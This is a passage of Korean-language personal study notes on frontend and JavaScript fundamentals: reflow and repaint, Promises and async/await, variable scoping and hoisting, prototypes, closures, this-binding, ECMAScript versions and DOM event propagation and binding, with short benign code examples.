   Reflow만 수행되면 실제 화면에 반영되지 않는다. Render Tree를 다시 화면에 그려주는 과정이 필요하다.
   결국은 Paint 단계가 다시 수행되는 것이며 이를 Repaint라고 한다.

<br>

### # Reflow(레이아웃 재계산) 발생 예시

1. 요소 크기 변경 (width, height, padding, margin 등)

2. 요소의 위치 혹은 정렬 변경 (top, left, right, bottom, position, transform, flex, grid, text-align 등)

3. 요소의 내용 변경 (예: 텍스트 내용 변경, 이미지 크기 변경, 폰트 크기 변경)

4. 디스플레이 속성 변경 (display, visibility, position 등)

5. DOM 트리에서 요소 추가/삭제 (예: appendChild, removeChild)

6. 브라우저 창 크기 조정

<br>

### # Repaint(화면 재그리기) 발생 예시

1. 배경 색상 변경 (background-color, color, border, box-shadow 등)

2. 글꼴 색상 변경 (font-family, font-size, font-weight, color 등)

3. 글꼴 스타일 변경 (font-style, text-transform 등)

4. 투명도 변경 (opacity)

5. 이미지나 비디오 콘텐츠 변경 (src, background-image 변경)

6. 애니메이션 및 변환 (transform, opacity 변화 등)

7. visibility 속성 변경 (단, visibility: hidden은 Reflow가 발생하며, display: none은 Reflow와 함께 트리에서 제거됨)

8. Reflow가 발생한 경우

<br>

### # 브라우저 렌더링 최적화 기법

1. 프레임워크 사용 : Nextjs와 같은 프레임워크를 활용

2. 웹팩 사용 : 웹팩과 같은 모듈 번들러를 사용하여 요청 파일 용량을 줄이고, 요청 파일 개수를 감소시킬 수 있다.

3. 이미지 최적화 : 이미지 사이즈 수정, 압축율이 좋은 이미지 포맷을 사용, 디스플레이 크기별 이미지 설정, 고정 값 사용, 이미지 스프라이트, 이미지 레이지 로딩, 이미지 CDN 사용 등 이미지 최적화 작업을 수행한다.

4. 코드 스플리팅 : 코드 스플리팅을 이용하여 필요한 모듈만 로드하여 요청 지연 시간을 줄인다. 다이나믹 임폴트 문법, 레이지 컴포넌트, 웹팩 엔드 포인트 설정 등의 방법 등이 있다.

5. 리플로우/리페인트 최소화 : 리플로우와 리페인트 발생을 최소화한다. 또한 리플로우가 발생하는 속성보다 리페인트만 발생하는 속성을 우선적으로 사용하는 것이 좋다.

6. 영향을 주는 노드 최소화 : 애니메이션이 자주 발생하거나 크기가 수시로 변하는 요소에 경우 주변 노드들과 연관성을 줄인다.

<br>

### # Promise

- Promise 객체

  Promise는 비동기 처리(비동기 API를 동기적으로 처리)를 위해 사용한다. 자바스크립트 엔진은 싱글 스레드 언어로 한 번에 하나의 테스크만 수행하며
  수행되는 동안 다른 테스크의 수행을 블로킹한다. 이로 인해 무거운 작업이나 네트워크 요청 등에서 블로킹이 발생할 수 있다.
  자바스크립트에서는 이러한 문제를 해결하기 위해 fetch, setTimeout과 같은 비동기 API를 사용한다. 비동기 작업은 js 브라우저 런타임 환경에서 제공되는
  Web API 영역에서 처리된 후, 먼저 완료된 순서에 따라 그 결과(콜백)는 마이크로태스크 큐(Microtask Queue)나 매크로태스크 큐(Macrotask Queue)에 등록되고,
  자바스크립트 엔진의 콜 스택이 비워졌을 때 이벤트 루프가 이를 꺼내 콜 스택에 전달하여 실행함으로써 싱글 스레드 환경에서도 마치 멀티 스레드처럼 비동기 처리가 가능해진다.
  하지만 메인 스레드는 차단되지 않아 아직 준비되지 않은 데이터에 접근해 undefined나 에러가 발생할 수 있다. 그렇기 때문에 콜백 패턴, Promise, async/await 문법을 활용한
  비동기 처리를 통해 비동기 API 처리 시점을 명확하게 한 후 후속 처리를 해야한다. Promise는 pending(대기), fulfilled(이행), rejected(거부) 세 가지 상태를 가지며,
  .then(), .catch(), .finally() 등의 메서드를 통해 후속 처리를 정의할 수 있다. 하지만 콜백 패턴은 예외 처리의 어려움과 함수의 중첩으로 인해 가독성과 유지보수성이
  떨어지는 콜백 지옥(callback hell)을 유발할 수 있다.

  - Promise는 내부적으로 class처럼 동작하는 생성자 함수다. 즉, constructor 함수이기 때문에 new 키워드로 호출해야만 인스턴스를 만들 수 있다.
  - 생성자 함수란 객체를 만들기 위한 함수이다. 쉽게 말해 어떤 틀(템플릿) 역할을 해서 그걸로 여러 개의 객체(인스턴스)를 찍어낼 수 있다.

  ```js
  // promise 사용 전 : 에러 케이스
  const data = fetch("/api/user");
  console.log(data.name); // ❌ undefined 또는 TypeError

  // promise 사용 후 : 정상 케이스
  fetch("/api/user")
    .then((response) => response.json()) // 응답 본문을 JSON으로 파싱 (또한 비동기)
    .then((data) => {
      console.log(data.name); // ✅ 여기서 접근 가능
    })
    .catch((err) => {
      console.error("Error:", err);
    });
  ```

  ```js
  // 콜백 패턴의 문제점 1. : 콜백 지옥(Callback Hell)
  const f1 = (callback) => {
    setTimeout(function () {
      console.log("1번 주문 완료");
      callback();
    }, 1000);
  };

  const f2 = (callback) => {
    setTimeout(function () {
      console.log("2번 주문 완료");
      callback();
    }, 3000);
  };

  const f3 = (callback) => {
    setTimeout(function () {
      console.log("3번 주문 완료");
      callback();
    }, 2000);
  };

  f1(function () {
    f2(function () {
      f3(function () {
        console.log("끝");
      });
    });
  });
  ```

  ```js
  // 콜백 패턴의 문제점 1. : Promise, async/await 활용
  const f1 = () => {
    return new Promise((resolve) => {
      setTimeout(() => {
        console.log("1번 주문 완료");
        resolve();
      }, 1000);
    });
  };

  const f2 = () => {
    return new Promise((resolve) => {
      setTimeout(() => {
        console.log("2번 주문 완료");
        resolve();
      }, 3000);
    });
  };

  const f3 = () => {
    return new Promise((resolve) => {
      setTimeout(() => {
        console.log("3번 주문 완료");
        resolve();
      }, 2000);
    });
  };

  // Promise
  f1()
    .then(() => f2())
    .then(() => f3())
    .then(() => {
      console.log("끝");
    })
    .catch((err) => {
      console.error("에러 발생!", err);
    })
    .finally(() => {
      console.log("모든 주문 처리 종료");
    });

  // async/await
  const handleOrders = async () => {
    try {
      await f1();
      await f2();
      await f3();
      console.log("끝");
    } catch (err) {
      console.error("에러 발생!", err);
    } finally {
      console.log("모든 주문 처리 종료");
    }
  };

  handleOrders();
  ```

  ```js
  // 콜백 패턴의 문제점 2. : 에러 처리의 한계
  try {
    setTimeout(() => {
      throw new Error("Error!");
    }, 1000);
  } catch (e) {
    console.log("에러를 캐치하지 못한다..");
    console.log(e);
  }
  ```

- Promise.all

  여러 개의 Promise를 동시에 실행하고 모두 이행(fulfilled) 되었을 때만 결과를 배열로 반환합니다.
  만약 하나라도 거부(rejected) 되면 전체가 실패로 간주되어 그 에러를 즉시 반환합니다.

- Promise.race

  여러 Promise를 동시에 실행하지만 가장 먼저 완료(이행 or 거부) 된 하나의 결과만 반환합니다.

<br>

### # async/await

- function 앞에 async를 붙여 사용하며 async를 붙이면 해당 함수는 항상 Promise를 반환한다. await는 async 함수 내부에서만 사용되며
  Promise가 처리(settled)될 때까지 함수 실행을 기다리게 만든다. 메인 스레드의 작업들은 멈추지 않고 await을 포함하고 있는 async 함수 내부만 일시정지된다.
  (async 키워드가 붙은 함수를 통째로 백그라운드 Web API로 넘긴다고 보면 된다. async 키워드가 붙은 함수를 비동기 api로 판별하여 바로 실행 후 해당 함수의
  컨텍스트를 콜스택에서 제거한 뒤 해당 함수를 통째로 Web API에서 처리한다고 이해했다. 그렇기 때문에 다음 작업들이 블로팅되지 않는다.)
  그 후 Promise가 처리되면 그 결과와 함께 실행이 재개된다. Promise가 처리되길 기다리는 동안엔 엔진이 다른 일(다른 스크립트를 실행, 이벤트 처리 등)을
  할 수 있기 때문에, CPU 리소스가 낭비되지 않는다. async/await의 사용하는 이유는 then 메소드 사용을 억제하여 코드가 더 간결해지고 가독성이 높아진다는 장점이 있다.

  ```js
  // 예제1 : 일반 비동기 통신
  const TestOne = () => {
    fetch("https://jsonplaceholder.typicode.com/posts/1").then((response) =>
      console.log("1")
    );

    console.log("2");
  };

  console.log("3");

  TestOne(); // 3 -> 2 -> 1

  // 예제2 : async를 사용한 비동기 통신
  const TestTwo = async () => {
    await fetch("https://jsonplaceholder.typicode.com/posts/1").then(
      (response) => console.log("1")
    );

    console.log("2");
  };

  console.log("3");

  TestTwo(); // 3 -> 1 -> 2
  ```

  TestOne 함수에서 3이 먼저 출력되는 이유는 메인 스레드 동작은 멈추지 않기 때문이고 TestOne 함수 내부에서 비동기 api는 다른 작업의 실행을 블로킹하지 않으므로
  2가 먼저 출력된다. 그 후 마지막으로 1이 출력된다. 반면 async/await를 활용한 TestTwo에서는 순서가 다르다.
  3이 먼저 출력되는 이유는 동일하고 TestTwo 함수 내부에서 1이 먼저 출력되는 이유는 비동기 api의 처리 시 다음 작업의 수행을
  블로킹하기 때문에 비동기 처리가 완료된 후 1을 출력하고 그 후 다음 작업을 수행하기 때문에 2를 출력한다.

<br>

### # var, let, const

- var, let, const 기본적인 차이

  1. var : 재선언 O, 재할당 O, 함수 레벨 스코프

  2. let : 재선언 X, 재할당 O, 블록 레벨 스코프

  3. const : 재선언 X, 재할당 X, 블록 레벨 스코프

- 변수가 메모리에 저장될 때 var, let, const의 차이

  변수는 콜스택 내부 실행 환경을 저장하는 객체인 실행컨텍스트의 Environment Record(환경 레코드)에 저장되는데
  var의 경우 환경 레코드의 베리어블 환경(`[[VariableEnvironment]]`), let과 const의 경우 환경 레코드의 렉시컬 환경(`[[LexicalEnvironment]]`)에 저장된다.
  또한 변수에 할당된 값은 콜스택 혹은 메모리 힙에서 주소와 값을 가지고 저장된 데이터인데 이 데이터의 주소를 참조하여 값을 할당하는 것이다.
  만약 참조하는 데이터가 원시 타입이라면 콜스택, 참조 타입이라면 메모리힙에 데이터 주소를 참조한다. 변수에 재선언 재할당의 경우 참조하는 주소 값이 바뀌게 되는 것이고
  const의 경우 재선언 재할당 모두 불가능한데 이 말은 참조하는 주소 값 변경이 불가능하다는 것이다. 다만 참조 타입의 경우 객체 프로퍼티 변경이 가능하다.

  ```js
  const obj = { a: 1 };
  obj.a = 2; // 가능

  obj = { b: 3 }; // ❌ TypeError: Assignment to constant variable
  ```

- Hoisting과 Temporal Dead Zone(TDZ) 관점에서 var, let, const의 차이

  호이스팅은 변수를 유효 스코프 최상단으로 끌어올리는 듯한 현상을 말한다. 즉 선언문 전에 변수에 접근할 경우 접근이 가능한 현상을 말하는 것이다.
  이 때 스코프 시작점과 변수 초기화 시작점까지의 구간을 템퍼럴 데드존이라고 한다. let과 const는 호이스팅이 발생하지 않는 것처럼 보이는데 그 이유는
  변수는 실행 컨텍스트 생성 단계에서 실행 컨텍스트에 변수를 등록하는 선언 단계, 변수를 위한 메모리 확보 후 undefined로 초기화하는 초기화 단계,
  실행 컨텍스트 실행 단계에서 선언문에 도달하여 실제 값을 할당하는 할당 단계로 나누어 생성되는데 var는 선언, 초기화가 동시에 이루어지고
  let과 const는 선언, 초기화가 나누어 이루어지는데 const는 초기화와 동시에 할당이 필수적으로 이루어져야한다.
  그렇기 때문에 실행 컨텍스트 실행 단계에서 선언문 변수 선언문 이전에 let, const에 접근하게 될 경우 아직 초기화 및 할당이 이루어지지 않은 상태이기 때문에 에러가 발생하게 된다.
  결론은 let, const의 경우 선언문 이전에 접근 시 실행 컨텍스트에 등록되어 있는 상태로 호이스팅은 발생하지만 초기화 및 할당된 값이 없기 때문에 에러가 발생하는 것이다.

<br>

### # Prototype

- 프로토타입이란?

  프로토타입을 통해 모든 객체들이 메소드와 속성들을 상속받을 수 있다. `[[Prototype]]`은 모든 객체가 가지는 숨겨진 내부 슬롯이다.
  `[[Prototype]]`은 `__proto__ (던더 프로토)`로 접근 가능하다. 또한 함수 객체는 `[[Prototype]]`과 함께 `prototype 프로퍼티`도 가지는데
  이 `prototype 프로퍼티`는 그 함수로 생성된 인스턴스가 상속받게 될 객체를 지정한다. 즉 부모 객체의 인스턴스인 자식 객체는 자신의 부모 `prototype 프로퍼티`를
  가리키는 `[[Prototype]]`을 가지고 있는 것이다. 함수 객체의 `prototype 프로퍼티`에는 자식에게 상속하기 위한 값이 담겨져있고
  `prototype 프로퍼티` 내부에 `constructor 프로퍼티`는 자기 자신을 생성한 함수를 가리키고 있다. 이처럼 객체의 `[[Prototype]]`, `prototype 프로퍼티`는
  console.dir을 통해 확인해볼 수 있다.

  - `[[Prototype]]`은 모든 객체가 가지는 숨겨진 내부 슬롯 (`__proto__`로 접근 가능)
  - `prototype 프로퍼티`는 함수 객체만 가지고 있는 일반 프로퍼티, 예를 들어 Array 함수 객체의 경우 `prototype 프로퍼티`에 map 메소드를 내장하고 있음

- 프로토타입 체인이란?

  어떤 객체에서 존재하지 않는 프로퍼티나 메소드에 접근하려고 하면 자바스크립트는 해당 객체의 `[[Prototype]]`이 가리키는 링크를 따라 위로 거슬러 올라가며
  자신의 부모 역할을 하는 프로토타입 객체의 프로퍼티 혹은 메소드를 차례대로 탐색한다. 이 연결 구조를 프로토타입 체인이라 한다.
  프로토타입 체인의 최상단은 Object의 `prototype 프로퍼티`(Object.prototype)이며, 프로토타입 체인의 종점이므로 `[[Prototype]]` 체인이 없다.

  - 표준 빌트인 객체 (Standard Built-in Objects) 중 생성자 함수 : ECMAScript 사양에 정의된 객체들. Object, Array, Function, String, Number, Boolean, Date, RegExp, Error, Promise 등

  - 예를 들어 배열 관련 메소드들을 사용할 수 있는 것도 내장 함수 객체인 Array에 `prototype 프로퍼티`를 상속받아 사용할 수 있는 것이다.

<br>

### # Closure

- 자신을 포함하고 있는 외부함수보다 내부함수가 더 오래 유지되는 경우, 외부 함수가 실행되어 제거된 후 내부함수가 호출되더라도
  외부함수의 지역 변수에 접근할 수 있는데 이러한 함수를 클로저라고 한다. 이것이 가능한 이유는 내부 함수 렉시컬 환경에 `[[Scopes]](스코프)`는 자신이 생성될 때의
  환경을 기억하기 때문이다. `[[Scopes]]`는 함수를 호출할 때가 아니라 함수를 어디에 선언하였는지에 따라 결정된다. 이러한 방식을 렉시컬 스코핑이라고 한다.
  console.dir을 통해 내부 함수를 콘솔에 찍어보면 `[[Scopes]]`에 클로저(`ex Closure (outerFunc)`)가 저장되어 있고 이 클로저에 이미 실행되어 사라진
  외부함수의 값이 담겨있는 것을 확인할 수 있다. 즉 가비지 컬렉터에게 이 함수가 아직 필요하다고 알려 메모리에 해당 값을 유지시키는 것이다.
  이러한 클로저를 활용하여 데이터를 보존하거나 정보의 은닉을 통해 의도치 않은 에러를 방지할 수 있다.

  ```js
  function outerFunc() {
    var x = 1;
    return function inner() {
      console.log(x * 2);
    };
  }

  var inner = outerFunc(); // outerFunc의 실행 컨텍스트는 사라지지만
  inner(); // inner가 outerFunc의 x에 접근 가능 → 클로저

  console.dir(inner);
  console.dir(outerFunc);
  ```

<br>

### # this

- this란 무엇인가?

  this란 자신이 속한 객체 또는 자신이 생성할 인스턴스를 가리키는 자기 참조 변수이다.
  실행 컨텍스트의 생성 단계에서는 전역 객체에 바인딩되며 실행 단계에서 동적으로 결정된다.

  1. 일반 함수의 this : 기본적으로 전역 객체(window)를 가리키지만, 엄격 모드(use strict mode)에서는 undefined

  2. 생성자 함수 this : 생성할 인스턴스

  3. 객체의 메소드 this : 메소드의 this는 객체를 가리키지만, 내부 함수에서는 전역 객체를 가리킬 수 있음.
     이를 해결하려면 this를 변수에 할당하거나, 화살표 함수를 사용할 수 있다.

     ```js
     const obj = {
       name: "Alice",
       sayName: function () {
         const self = this; // `this`를 self에 할당
         console.log(self.name); // self는 obj를 가리킴

         function inner() {
           console.log(self.name); // self는 obj를 가리킴
         }
         inner();
       },
     };

     obj.sayName(); // "Alice", "Alice"
     ```

- this 바인딩 메소드 bind, call, apply

  일반 함수의 경우 bind, call, apply 함수 메소드를 통해 명시적으로 this를 바꿀 수 있다. 세 가지 메소드의 공통점은 첫번째 파라미터로 this를 바인딩할 수 있고
  두번째 파라미터로 해당 함수에 인자를 전달한다. 차이점은 bind는 this바인딩 후 함수를 실행하지 않고, call은 this바인딩 후 함수를 실행하는데
  함수의 인자를 개별로 전달하고 apply는 this바인딩 후 함수를 실행하는데 함수의 인자를 배열로 묶어 전달한다.

  ```javascript
  var obj2 = { c: "d" };

  function b() {
    console.log(this);
  }

  b(); // Window
  b.bind(obj2).call(); // obj2
  b.call(obj2); // obj2
  b.apply(obj2); // obj2
  ```

- 일반함수의 this vs 화살표 함수의 this

  일반 함수는 호출 방식에 따라 this에 바인딩할 객체를 결정하고 화살표 함수는 언제나(메소드 사용해도 바뀌지 않음) 상위 스코프 객체를 this에 바인딩한다.

  ```js
  const obj = {
    value: 100,
    normalFunc: function () {
      console.log("normalFunc this:", this); // obj
    },
    arrowFunc: () => {
      console.log("arrowFunc this:", this); // 전역 객체(window or undefined in strict mode)
    },
  };

  obj.normalFunc(); // this → obj
  obj.arrowFunc(); // this → 상위 스코프 (여기선 전역)
  ```

<br>

### # 일반 함수와 화살표 함수의 차이

<br>

- 일반 함수와 화살표 함수의 차이

  1. this 바인딩 방식 : 일반 함수는 호출 방식(객체의 메소드로 호출, this 바인딩 메소드에 의한 호출 등)에 따라 this가 결정되고,
     화살표 함수는 언제나 상위 스코프 this를 가리킨다.

  2. 생성자 함수로 사용 가능 여부 : 일반 함수는 생성자 함수로 사용 가능하지만 화살표 함수는 생성자 함수로 사용할 수 없다.
     왜냐하면 prototype 프로퍼티를 가지고 있지 않기 때문이다.

  3. arguments 객체 : 함수 생성 시 일반 함수는 인자가 arguments 객체에 바인딩 되지만 화살표 함수에서는 인자가 arguments 객체에 바인딩 되지 않는다.

- 화살표 함수 사용 이유

  코드를 간결하게 작성할 수 있고 코드가 간결하기 때문에 생산성 향상 및 가독성이 좋아진다.

<br>

### # javascript의 use strict 모드

- 자바스크립트 언어의 문법을 보다 엄격히 적용하여 오류를 발생시킬 가능성이 높거나 자바스크립트 엔진의 최적화 작업에 문제를 일으킬 수 있는 코드에 대해 명시적인 에러를 발생시킨다. 전역에서 선언하면 모든 소스코드가 대상이고, 로컬(함수 내부)로 선언하면 함수 내에서만 대상이 된다. use strict 모드에서는 삭제가 불가능한 프로퍼티를 삭제하거나 함수의 매개변수를 중복해서 사용하는 것 등이 금지된다. use strict 모드를 사용하면 엄격한 동작으로 코드 작성 단계(컴파일 타임)에서 에러를 사전에 발견할 수 있다는 장점과 디버깅이 쉬워진다는 장점이 있다. 하지만 단점의 경우 대부분의 브라우저가 use strict 모드를 지원하지만 아주 오래된 브라우저의 경우 엄격 모드의 코드가 다른 방식으로 동작할 수 있다.

  ```js
  // case 1. 중복 매개변수
  function example(a, a) {
    console.log(a); // 에러 발생!
  }

  // case 2. 삭제 불가능한 프로퍼티
  delete Object.prototype; // 에러 발생!

  // case 3. this 바인딩
  function test() {
    console.log(this); // `undefined`, 엄격 모드에서는 `this`가 `undefined`
  }

  test();
  ```

<br>

### # ECMAScript

- ECMAScript

  ECMA 인터내셔널이라는 비영리 표준화 기구에서 정보 통신에 대한 표준을 제정하는데 ECMAScript는 ECMA 인터내셔널이 명세한 스크립트 언어를 어떻게 만들어야 하는지를 설명하는
  일종의 표준화 설명서이고, JavaScript는 ECMAScript의 사양을 바탕으로 만들어진 언어이다.

- ECMAScript 버전별 차이

  | 버전              | 발표년도 | 주요 기능                                                                                                                                       |     |                                                       |
  | ----------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------------------------- | --- | ----------------------------------------------------- |
  | **ES6 (ES2015)**  | 2015     | `let`, `const`, 클래스, 화살표 함수, 템플릿 리터럴, 디스트럭처링, `Promise`, `Map`/`Set`, `module (import/export)`, `Symbol`                    |     |                                                       |
  | **ES7 (ES2016)**  | 2016     | `Array.prototype.includes`, 지수 연산자 `**`                                                                                                    |     |                                                       |
  | **ES8 (ES2017)**  | 2017     | `async/await`, `Object.entries()`, `Object.values()`, `String.padStart`, `String.padEnd`                                                        |     |                                                       |
  | **ES9 (ES2018)**  | 2018     | Rest/Spread 연산자 개선, 비동기 반복문 (`for await...of`), 정규식 개선 (lookbehind 등)                                                          |     |                                                       |
  | **ES10 (ES2019)** | 2019     | `Array.flat()`, `Array.flatMap()`, `Object.fromEntries()`, `trimStart/trimEnd`                                                                  |     |                                                       |
  | **ES11 (ES2020)** | 2020     | `optional chaining (?.)`, `nullish coalescing (??)`, `Promise.allSettled`, `globalThis`, BigInt                                                 |     |                                                       |
  | **ES12 (ES2021)** | 2021     | `String.replaceAll`, `Promise.any`, `WeakRef`, \`logical assignment operators (&&=,                                                             |     | =, ??=)`, `structuredClone\` (브라우저는 약간 지연됨) |
  | **ES13 (ES2022)** | 2022     | 클래스 필드, 정적 블록, `at()` 메서드 (`array.at()`), `Error.cause`, top-level await (모듈)                                                     |     |                                                       |
  | **ES14 (ES2023)** | 2023     | `Array.prototype.findLast`, `findLastIndex`, `Symbol.prototype.description`, `hashbang`(`#!`), 정적 `Array.prototype.toSorted()` 등 불변 메서드 |     |                                                       |

- ECMAScript 최신 버전 상세

  - Array.prototype.findLast() & Array.prototype.findLastIndex()

    기존의 find()는 앞에서부터 찾았지만, 이제 뒤에서부터도 찾을 수 있다.

    ```js
    const arr = [1, 2, 3, 4, 5, 6];

    arr.findLast((n) => n % 2 === 0); // 6
    arr.findLastIndex((n) => n % 2 === 0); // 5
    ```

  - Array.prototype.toSorted(), toReversed(), toSpliced(), with()

    기존 배열을 변경하지 않고 새로운 배열을 반환한다. (불변성 유지)

    ```js
    // toSorted
    const arr = [3, 1, 2];
    const sorted = arr.toSorted(); // [1, 2, 3]
    console.log(arr); // [3, 1, 2] (원본 그대로)
    ```

    ```js
    // toReversed
    const reversed = arr.toReversed(); // [2, 1, 3]
    ```

    ```js
    // toSpliced
    const arr = [1, 2, 3];
    const newArr = arr.toSpliced(1, 1, 99); // [1, 99, 3]
    ```

    ```js
    const arr = [0, 1, 2];
    const newArr = arr.with(1, 100); // [0, 100, 2]
    ```

  - Symbol.prototype.description

    기존에는 Symbol("foo").description이 명세상 없었지만, 이제는 표준적으로 접근 가능하다.

    ```js
    const sym = Symbol("example");
    console.log(sym.description); // "example"
    ```

  - Hashbang(#!) 지원

    Node.js에서 스크립트를 실행할 때 사용되는 #! 문법을 이제 JS 스펙으로 인정한다.

    ```js
    #!/usr/bin/env node

    console.log("Hello from Node script");
    ```

  - 기타 개선 사항

    - JSON.parse가 BOM(Byte Order Mark)을 무시하도록 명확히 정의됨

    - RegExp 개선 사항 (정규식 엔진 명세 업데이트)

    - Private 필드가 더 엄격하게 동작하도록 처리 (클래스 보안 향상)

<br>

### # 순수 함수

- 순수 함수란

  1. 동일한 인자 전달 시 항상 동일한 값 반환

  2. 외부에 영향을 주거나 받지 않음 (사이드 이펙트 x)

- 순수 함수를 사용하는 이유

  1. 반환되는 결과가 예측 가능하므로 실행 시점이 중요하지 않음

  2. 다른 순수 함수들과 조합하여 사용하는 것이 용이하여 재사용성이 증가

  3. 테스트가 간단함

<br>

### # 스코프(Scope)

- 스코프란?

  스코프는 변수나 함수 등 참조 대상 식별자를 구분할 수 있는 유효 범위를 말한다. 실행 컨텍스트 생성 단계에서 결정되며 이 스코프가 이어진 형태를 스코프 체인이라고 한다.

- 전역 스코프 / 함수 레벨 스코프 / 블록 레벨 스코프 / 렉시컬 스코프

  1. 전역 스코프 (Global scope) : 전역에서 참조할 수 있다. 전역 스코프를 갖는 변수를 전역 변수라고 한다.

  2. 지역 스코프 or 함수 레벨 스코프(Local scope or Function-level scope) : 함수 코드 블록이 만든 스코프로 함수 자신과 하위 함수에서만 참조할 수 있다. 지역 스코프를 갖는 변수를 지역 변수라고 한다.

  3. 블록 레벨 스코프(block-level scope) : 블록 레벨 스코프란 코드 블록({…})내에서 유효한 스코프를 의미한다. 함수나 조건문 코드 블록이 블록 레벨 스코프이다.

  4. 렉시컬 스코프(Lexical scope) : 함수를 어디서 호출하는지가 아니라 어디에 선언하였는지에 따라 상위 스코프가 결정되는 것을 말한다. 자바스크립트는 렉시컬 스코프를 따르며 실행컨텍스트 생성 단계에서 결정된다.

- 스코프 체인

  자신의 스코프에서 참조하고자 하는 식별자를 찾은 후 존재하지 않는다면 상위 스코프로 올라가며 마지막 최상위 스코프까지 순차적으로 식별자를 찾게 된다. 이와 같이 자신의 스코프부터 최상위 스코프까지 스코프가 연결되어 있는 형태를 스코프 체인이라고 한다.

  ```js
  var a = "전역 변수";

  function outer() {
    var b = "outer 함수 변수";

    function inner() {
      var c = "inner 함수 변수";

      console.log(a); // 전역 스코프 참조 -> 전역 변수
      console.log(b); // outer 함수의 지역 스코프 참조 -> outer 함수 변수
      console.log(c); // inner 함수의 지역 스코프 참조 -> inner 함수 변수
    }

    inner();
  }

  outer();
  ```

<br>

### # 이벤트 전파

- 이벤트 전파란?

  ![javascript_이벤트전파_01](https://github.com/Yu-jae-min/Basic-concept/assets/85284246/d986b842-c9d3-4f50-ae72-7ab3572a1844)

  DOM 이벤트(마우스를 클릭하거나 키보드를 누르는 등 사용자 행위)의 흐름은 캡처링, 타깃, 버블링 단계로 나누어서 이루어진다.
  캡처링은 이벤트가 발생한 요소부터 하위 요소로 이벤트가 전파되는 단계이고 타깃 단계는 이벤트가 실제 타깃 요소에 전달되는 단계이며 별도로 처리되지 않는다.
  버블링은 이벤트가 발생한 요소부터 상위 요소로 이벤트가 전파되는 단계이다. 이벤트 흐름은 항상 캡처링으로 시작하여 버블링으로 종료된다.
  예를 들어 캡처링이 `Window -> Document -> <html> -> <body> -> <div> -> <button>` 와 같은 흐름으로 발생하고 있을 때 `<button>`에서 타깃 요소에
  이벤트가 전달된 후 버블링은 반대인 `<button> -> <div> -> <body> -> <html> -> Document -> Window`로 이벤트가 전달되는 것이다.
  또한 이벤트 리스너 등록 시 capture 파라미터의 불리언 값을 통해 캡처링 단계에서 이벤트를 감지할 지, 버블링 단계에서 이벤트를 감지할 지 결정할 수 있다.

  ```js
  div.addEventListener("click", clickEvent, { capture: true });
  ```

  예를 들어 div -> ul -> li 순으로 DOM을 구성하고 li에 이벤트 리스너를 등록한 후 버블링 단계에서 이벤트가 실행되도록 설정해놓는다.
  이 때 사용자가 li를 클릭하여 클릭이라는 이벤트를 발생시키게 되면 div -> ul -> li의 캡쳐링 단계를 지나쳐 li -> ul-> div의 버블링 단계를 거치는데
  버블링 단계 중 이벤트 리스너가 달린 li를 지나칠 때 이벤트가 발생하게 되며 이벤트 리스너가 등록되지 않은 ul과 div에서는 이벤트가 발생하지 않는다.

  ```js
  // li에만 리스너를 등록
  document.getElementById("li").addEventListener("click", function () {
    console.log("clicked li");
  });
  ```

  ```html
  <div id="div">
    <ul id="ul">
      <li id="li">Click me</li>
    </ul>
  </div>
  ```

- event.target vs event.currentTarget

  1. event.target : 실제 이벤트가 발생하는 요소

  ```html
  // 브라우저에서 "테스트"라는 텍스트를 클릭했을 때 span이 event.target // 실제
  클릭되는 요소는 버튼이 아닌 "테스트"라는 텍스트
  <button onClick="{onClick}">
    <span>테스트</span>
  </button>
  ```

  2. event.currentTarget : 이벤트 리스너가 달린 요소

  ```html
  // 브라우저에서 "테스트"라는 텍스트를 클릭했을 때 button이 event.currentTarget
  // 실제 클릭되는 요소는 버튼이 아닌 "테스트"라는 텍스트지만, 이벤트 리스너는
  버튼에 달려있음
  <button onClick="{onClick}">
    <span>테스트</span>
  </button>
  ```

<br>

### # event.preventDefault, event.stopPropagation

- event.preventDefault()

  이벤트가 발생했을 때 브라우저가 기본적으로 수행하는 행동을 막는다. 예를 들어 a태그 링크 이동, form태그의 submit 기능과 같은 경우가 있다. 이벤트 전파는 막히지 않는다.

- event.stopPropagation()

  이벤트 전파를 막는다.

<br>

### # 이벤트 바인딩

- 이벤트 바인딩이란?

  이벤트가 발생한 요소와 이벤트(콜백 함수)를 연결해주는 것이 이벤트 바인딩이다. 이벤트 바인딩의 방법은 총 3가지 방법이 있는데
  HTML 이벤트 핸들러, DOM 이벤트 핸들러, DOM EventListener을 이용한 방법이 있다.

  1. HTML 이벤트 핸들러 방법

  HTML 이벤트 핸들러 방식은 HTML 요소의 이벤트 Attribute에 이벤트 핸들러를 대응시키는 방법이다. 이 방법은 HTML과 Javascript가 혼용이 되는데,
  간단한 이벤트 처리에는 빠르게 사용할 수 있지만 자바스크립트와 HTML이 혼합되어 코드가 복잡해질 수 있다.

  ```html
  <button class="btn" onmouseover="alert('Mouse is over the button!')">
    Hover over me
  </button>
  <button class="btn" onclick="myFunction()"></button>
  ```

  2. DOM 이벤트 핸들러 방법

  DOM 이벤트 핸들러 방식은 자바스크립트에서 DOM 요소의 이벤트 속성을 사용하여 이벤트를 바인딩하는 방법이다.
  HTML과 Javascript가 혼용되는 문제는 해결되었지만 하나의 이벤트에 하나의 핸들러만 등록할 수 있는 단점이 있다.
  즉, 한 이벤트에 여러 개의 핸들러를 바인딩하려면 addEventListener를 사용해야 한다.

  ```html
  <button id="myBtn">Click me</button>;
  ```

  ```javascript
  var myBtn = document.getElementById("myBtn");

  // 첫 번째 바인딩된 이벤트 핸들러 => 실행되지 않는다.
  myBtn.onclick = function () {
    alert("Button clicked 1");
  };

  // 두 번째 바인딩된 이벤트 핸들러 => 첫 번째 이벤트 핸들러를 덮어쓴다.
  myBtn.onclick = function () {
    alert("Button clicked 2");
  };
  ```

  3. DOM 이벤트 리스너 방법

  addEventListener 함수를 이용하여 대상 요소(Event Target)에 이벤트를 바인딩하고, 해당 이벤트가 발생했을 때
  실행될 콜백 함수를 지정하는 방식이다. addEventListener 함수의 인자는 이벤트 타입(ex onclick), 실행 될 콜백함수, 캡처링 사용여부 순으로 전달할 수 있다.
  DOM 이벤트 리스너 방법은 하나의 이벤트에 여러 핸들러를 추가할 수 있고 버블링과 캡처링을 지원한다.

  ```js
  // 예시 target.addEventListener(type, listener[, useCapture]);

  var el = document.getElementById("outside");

  el.addEventListener(
    "click",
    function () {
      modifyText("four");
    },
    false
  );
  ```

<br>

### # undefined / undeclared / null 차이점

- undefined

  변수 선언 후 값이 할당되지 않은 상태, 타입 undefined

- undeclared

  선언 자체가 되지 않은 변수, 타입 없음 에러 발생

- null

